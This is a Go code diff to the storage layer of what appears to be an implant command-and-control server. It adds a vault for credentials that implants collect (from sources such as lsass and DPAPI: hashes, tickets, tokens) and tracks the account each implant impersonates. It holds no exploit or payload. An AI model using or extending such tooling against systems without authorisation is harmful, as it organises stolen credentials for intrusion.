@@ -151,6 +151,10 @@ type Agent struct {
 	// server keeps them: an operator who has forgotten three start-up
 	// entries on one machine has a problem at the end of the engagement.
 	Persist []PersistEntry `json:"persist,omitempty"`
+	// Impersonation is the account the implant runs as when it is not the
+	// account it started with.  The server keeps it so the inventory shows
+	// the truth, and it drops it when the session of the agent ends.
+	Impersonation string `json:"impersonation,omitempty"`
 	// Posture is what the implant thinks of the host it runs on.
 	//
 	// The beacon reports its posture with the evasion tasks, and the
@@ -228,6 +232,53 @@ func (a *Agent) Clone() *Agent {
 	return &c
 }
 
+// Credential is one piece of material in the vault.
+//
+// The record is what the operator acts on: where the material came from,
+// which account it belongs to, what kind of material it is and how sure
+// the implant was.  The secret itself is kept encrypted when the operator
+// configured a key, and the digest is always kept, so two hosts that share
+// a credential can be seen to share it without the key.
+type Credential struct {
+	ID      string `json:"id"`
+	AgentID string `json:"agent_id"`
+	// Source is where the material came from ("vault", "lsass", "dpapi").
+	Source string `json:"source"`
+	// Account is the account the material belongs to.
+	Account string `json:"account"`
+	// Target is the service or the host the material belongs to.
+	Target string `json:"target"`
+	// Kind is "password", "hash", "ticket", "token" or "key".
+	Kind string `json:"kind"`
+	// Secret is the material itself, encrypted at rest when the operator
+	// configured a vault key.  Empty when the server has no key.
+	Secret string `json:"secret,omitempty"`
+	// Digest is the SHA-256 of the material in the clear.  It is what the
+	// server compares when it looks for the same secret twice.
+	Digest string `json:"digest"`
+	// Confidence is how sure the implant was, from 0 to 100.
+	Confidence int `json:"confidence"`
+	// Note says how the material was found.
+	Note      string    `json:"note,omitempty"`
+	Collected time.Time `json:"collected"`
+}
+
+// Clone returns a copy of the record.
+func (c *Credential) Clone() *Credential {
+	cp := *c
+	return &cp
+}
+
+// Redacted returns a copy of the record without the secret.
+//
+// The console shows this by default: an operator sees the shape of the
+// material and asks for the value when they really need it.
+func (c *Credential) Redacted() *Credential {
+	cp := c.Clone()
+	cp.Secret = ""
+	return cp
+}
+
 // Task is one queued or completed command.
 type Task struct {
 	ID        string         `json:"id"`
@@ -281,6 +332,9 @@ type snapshot struct {
 	Agents    []*Agent    `json:"agents"`
 	Tasks     []*Task     `json:"tasks"`
 	Schedules []*Schedule `json:"schedules,omitempty"`
+	// Credentials is the vault.  The secrets in it are already encrypted
+	// when the operator configured a key.
+	Credentials []*Credential `json:"credentials,omitempty"`
 }
 
 // binMarker is the key a binary argument is wrapped in on its way to disk.
@@ -381,6 +435,10 @@ type Store struct {
 	schedules map[string]*Schedule
 	schedIDs  []string // insertion order, for stable listing
 
+	// credentials is the vault of the engagement: the material the
+	// implants collected, with the source and the confidence.
+	credentials map[string]*Credential
+
 	// writeMu serialises file writes. Without it two goroutines shared one
 	// "<path>.tmp" file and could rename a half-rewritten document into place.
 	writeMu sync.Mutex
@@ -463,10 +521,11 @@ func loadSnapshot(path string) (*snapshot, string, error) {
 // Open loads (or initialises) the store at path.
 func Open(path string) (*Store, error) {
 	s := &Store{
-		path:      path,
-		agents:    make(map[string]*Agent),
-		tasks:     make(map[string]*Task),
-		schedules: make(map[string]*Schedule),
+		path:        path,
+		agents:      make(map[string]*Agent),
+		tasks:       make(map[string]*Task),
+		schedules:   make(map[string]*Schedule),
+		credentials: make(map[string]*Credential),
 	}
 	if path == "" {
 		return s, nil
@@ -498,6 +557,12 @@ func Open(path string) (*Store, error) {
 		if t.State == TaskDelivered {
 			t.State = TaskQueued // the agent may never have executed it
 		}
+	}
+	for _, c := range snap.Credentials {
+		if c == nil || c.ID == "" {
+			continue
+		}
+		s.credentials[c.ID] = c
 	}
 	for _, sc := range snap.Schedules {
 		if sc.ID == "" {
@@ -914,6 +979,78 @@ func (s *Store) Persistence(agentID string) []PersistEntry {
 	return append([]PersistEntry(nil), a.Persist...)
 }
 
+// AddCredential puts a record into the vault and returns a copy of it.
+func (s *Store) AddCredential(c *Credential) *Credential {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	if c.ID == "" {
+		c.ID = NewID("cred")
+	}
+	if c.Collected.IsZero() {
+		c.Collected = time.Now().UTC()
+	}
+	s.credentials[c.ID] = c.Clone()
+	return c.Clone()
+}
+
+// Credentials returns the records of the vault, newest first.
+//
+// The filters are the ones an operator actually uses: the host the
+// material came from, the kind of the material and a search over the
+// account, the target and the note.
+func (s *Store) Credentials(agentID, kind, query string, limit int) []Credential {
+	s.mu.RLock()
+	defer s.mu.RUnlock()
+	if limit <= 0 {
+		limit = 200
+	}
+	needle := strings.ToLower(strings.TrimSpace(query))
+	out := make([]Credential, 0, len(s.credentials))
+	for _, c := range s.credentials {
+		if agentID != "" && c.AgentID != agentID {
+			continue
+		}
+		if kind != "" && c.Kind != kind {
+			continue
+		}
+		if needle != "" {
+			hay := strings.ToLower(strings.Join([]string{
+				c.Account, c.Target, c.Source, c.Kind, c.Note, c.AgentID,
+			}, " "))
+			if !strings.Contains(hay, needle) {
+				continue
+			}
+		}
+		out = append(out, *c.Clone())
+	}
+	sort.Slice(out, func(i, j int) bool {
+		return out[i].Collected.After(out[j].Collected)
+	})
+	if len(out) > limit {
+		out = out[:limit]
+	}
+	return out
+}
+
+// CredentialCount returns how many records the vault holds.
+func (s *Store) CredentialCount() int {
+	s.mu.RLock()
+	defer s.mu.RUnlock()
+	return len(s.credentials)
+}
+
+// SetImpersonation records the account an agent runs as, or clears it.
+func (s *Store) SetImpersonation(agentID, account string) bool {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	a, ok := s.agents[agentID]
+	if !ok {
+		return false
+	}
+	a.Impersonation = account
+	return true
+}
+
 // Complete records a task result.
 //
 // A result that arrives after the task was cancelled keeps the cancelled state:
@@ -1130,6 +1267,9 @@ func (s *Store) Save() error {
 			snap.Schedules = append(snap.Schedules, sc.Clone())
 		}
 	}
+	for _, c := range s.credentials {
+		snap.Credentials = append(snap.Credentials, c.Clone())
+	}
 	s.mu.RUnlock()
 
 	raw, err := json.MarshalIndent(&snap, "", "  ")
@@ -1260,6 +1400,7 @@ func (s *Store) Wipe() (agents, tasks, schedules int) {
 	s.order = nil
 	s.schedules = make(map[string]*Schedule)
 	s.schedIDs = nil
+	s.credentials = make(map[string]*Credential)
 	return
 }
 
